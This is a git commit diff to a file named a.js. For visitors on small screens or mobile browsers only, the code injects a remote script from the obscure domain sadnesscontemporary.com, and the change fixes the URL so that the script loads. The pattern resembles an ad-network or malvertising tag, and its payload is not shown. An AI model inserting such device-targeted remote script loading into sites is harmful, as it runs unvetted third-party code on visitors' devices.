c10a6ab5bac3c051ce64d1b466c8412ea954bff8
dork12 <127926288+yukrini@users.noreply.github.com>
2023-03-15 15:42:42 +0700

    Update a.js

--- a.js
+++ a.js
@@ -3,5 +3,7 @@ if (screen.width < 500 ||
  navigator.userAgent.match(/webOS/i) ||
  navigator.userAgent.match(/iPhone/i) ||
  navigator.userAgent.match(/iPod/i)){	 
-	(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'sadnesscontemporary.com/b5/13/86/b513868d33b5b1194392b4fd19a3dc2a.js',document.body||document.documentElement);
+	(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'//sadnesscontemporary.com/b5/13/86/b513868d33b5b1194392b4fd19a3dc2a.js',document.body||document.documentElement);
 	 }
+
+
